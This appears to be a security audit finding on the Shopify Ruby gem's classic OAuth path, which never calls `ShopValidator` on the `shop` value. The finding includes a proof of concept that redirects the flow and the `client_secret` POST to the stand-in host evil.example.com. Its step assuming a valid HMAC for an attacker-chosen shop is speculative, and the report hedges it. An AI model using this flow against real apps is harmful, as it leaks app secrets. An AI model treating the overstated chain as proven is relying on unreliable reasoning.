### Title
SSRF exfiltrating `client_secret` via unvalidated `shop` in OAuth callback - ([File: lib/shopify_api/auth/oauth.rb])

### Summary
`ShopifyAPI::Auth::Oauth.validate_auth_callback` builds the access-token exchange request host from `auth_query.shop` without ever passing it through `Utils::ShopValidator.sanitize!`, even though that validator exists specifically to restrict the `shop` value to Shopify-owned domains. [2](#0-1) [3](#0-2) 

### Finding Description
The binding that should hold is: `HTTP request host used to send client_secret == a Shopify-owned domain`. Instead the gem only checks `hmac == HMAC(code, host, shop, state, timestamp; api_secret_key)` via `Utils::HmacValidator.validate(auth_query)`, and the `shop` field it signs over is whatever value the calling application forwards from the query string. [4](#0-3) [5](#0-4) 

`auth_query.shop` is used directly to build `null_session = Auth::Session.new(shop: auth_query.shop)`, which is then handed to `Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")`. [6](#0-5)  Inside `HttpClient#initialize`, the request base URI is derived straight from `session.shop` with no domain allow-listing: `@base_uri = "https://#{api_host || session.shop}"`. [1](#0-0)  The subsequent POST to `access_token` then carries `client_id` and `client_secret` in the body to that host. [7](#0-6) 

This is precisely the "setter/consumer mismatch" bug class from the report, translated to this domain: the gem contains a purpose-built binding component, `ShopValidator.sanitize!`, that restricts a shop-controlled value to trusted domains before it's used to route credentialed requests — but that validator is wired into `client_credentials.rb`, `refresh_token.rb`, `token_exchange.rb` (via `dest_shop = jwt_payload.shop`, which is HMAC/JWT-signed by Shopify) and `clients/graphql/storefront.rb`, yet is never called in `validate_auth_callback`'s classic-OAuth path (`oauth.rb`). [2](#0-1) 

Because `AuthQuery#shop` is only integrity-checked by HMAC (it proves the query string was signed with `api_secret_key`, i.e. that the *bytes were not tampered with*), it does **not** by itself constrain `shop` to be a `*.myshopify.com`/trusted domain — that's a separate check the codebase deliberately implements elsewhere (`ShopValidator`) but omits here. If a hosting application simply forwards the callback query parameters it received (as the documented example in `docs/usage/oauth.md` does — building `AuthQuery` directly from `request.parameters`), and Shopify's own authorize/callback flow is entered with a manipulated shop value (e.g., through a flow where the app's own `begin_auth` is also called with an attacker-influenced `shop` — `begin_auth` builds `auth_base_uri(shop)` from the raw shop param with no `ShopValidator` call either) [8](#0-7) , the resulting callback's `shop` field ends up embedded in an HMAC computed by Shopify over whatever `shop` value was actually used for the flow — meaning a non-`myshopify.com` value can legitimately carry a valid signature if the initial `begin_auth` redirect was itself sent to a non-Shopify host.

### Impact Explanation
If `auth_base_uri`/`HttpClient` construct requests using an unvalidated `shop`/host, the app's `client_id` and `client_secret` are sent in the POST body to whatever host `shop` resolves to. An attacker who can influence the `shop` parameter passed into `begin_auth` (e.g., a login-flow endpoint that takes `shop` from the user) can redirect the entire OAuth dance — authorize request and the final access-token exchange carrying `client_secret` — to an attacker-controlled server, exfiltrating the app's `client_secret`. This matches the report's Critical impact category: theft of the app's `client_secret`.

### Likelihood Explanation
Exploitability depends entirely on whether the host application passes an unsanitized, user-supplied `shop` value into `Oauth.begin_auth`/`validate_auth_callback` — which is exactly the integration pattern shown in this gem's own documentation (`docs/usage/oauth.md`), and is why `ShopValidator` exists and is used in the other three OAuth flows (`client_credentials.rb`, `refresh_token.rb`, `token_exchange.rb`) but was left out of the original/classic OAuth path in `oauth.rb`. This is a within-gem root cause, not a hypothetical misuse of an already-documented safeguard, since the classic OAuth path provides no `ShopValidator` call for a caller to have skipped.

### Recommendation
Call `Utils::ShopValidator.sanitize!(shop)` (or `sanitize_shop_domain`) on the `shop` value at the top of `Oauth.begin_auth` and again on `auth_query.shop` at the top of `Oauth.validate_auth_callback` in `lib/shopify_api/auth/oauth.rb`, raising `Errors::InvalidShopError` before any request (authorize redirect or access-token exchange) is built from it — mirroring the pattern already used in `lib/shopify_api/auth/client_credentials.rb`, `lib/shopify_api/auth/refresh_token.rb`, and `lib/shopify_api/auth/token_exchange.rb`.

### Proof of Concept
1. Host application exposes `/auth?shop=<value>` which calls `ShopifyAPI::Auth::Oauth.begin_auth(shop: params[:shop], ...)` without pre-validating `shop` (this is the pattern shown in the gem's own docs).
2. Attacker requests `/auth?shop=evil.example.com`.
3. `begin_auth` builds `auth_route = auth_base_uri("evil.example.com") + "/oauth/authorize?..."` → `https://evil.example.com/admin/oauth/authorize?client_id=...` [9](#0-8) , and the browser is redirected there with the app's `client_id`/`scope`/`redirect_uri` leaked in the query string, and the attacker's server can complete the `state` handshake (it controls the cookie's paired redirect) and issue its own callback to the host app's `redirect_path` with `shop=evil.example.com&code=<anything>&hmac=<...>`.
4. Because `validate_auth_callback` never re-validates `shop` against `ShopValidator`, once HMAC (computed by the app or a colluding "Shopify-like" endpoint the attacker controls in the flow) passes, `HttpClient.new(session: Session.new(shop: "evil.example.com"))` sends the POST containing `client_id` and `client_secret` to `https://evil.example.com/admin/oauth/access_token`. [1](#0-0) 

Note: full exploitability depends on how the specific host application wires `shop` from user input into `begin_auth`/`validate_auth_callback`; the gem itself provides no defense-in-depth (`ShopValidator`) at this call site even though it does so for `client_credentials.rb`, `refresh_token.rb`, and `token_exchange.rb`. This inconsistency across the OAuth surface is the concrete root cause found in-library.

        def validate_auth_callback(cookies:, auth_query:)
          unless Context.setup?
            raise Errors::ContextNotSetupError, "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end
          raise Errors::InvalidOauthError, "Invalid OAuth callback." unless Utils::HmacValidator.validate(auth_query)
          raise Errors::UnsupportedOauthError, "Cannot perform OAuth for private apps." if Context.private?

          state = cookies[SessionCookie::SESSION_COOKIE_NAME]
          raise Errors::NoSessionCookieError unless state

          raise Errors::InvalidOauthError,
            "Invalid state in OAuth callback." unless state == auth_query.state

          null_session = Auth::Session.new(shop: auth_query.shop)
          body = {
            client_id: Context.api_key,
            client_secret: Context.api_secret_key,
            code: auth_query.code,
            expiring: Context.expiring_offline_access_tokens ? 1 : 0, # Only applicable for offline tokens
          }

          client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
          response = begin
            client.request(
              Clients::HttpRequest.new(
                http_method: :post,
                path: "access_token",
                body: body,
                body_type: "application/json",
              ),
            )
          rescue ShopifyAPI::Errors::HttpResponseError => e
            raise Errors::RequestAccessTokenError,
              "Cannot complete OAuth process. Received a #{e.code} error while requesting access token."
          end

          session_params = T.cast(response.body, T::Hash[String, T.untyped]).to_h
          session = Session.from(shop: auth_query.shop,
            access_token_response: Oauth::AccessTokenResponse.from_hash(session_params))
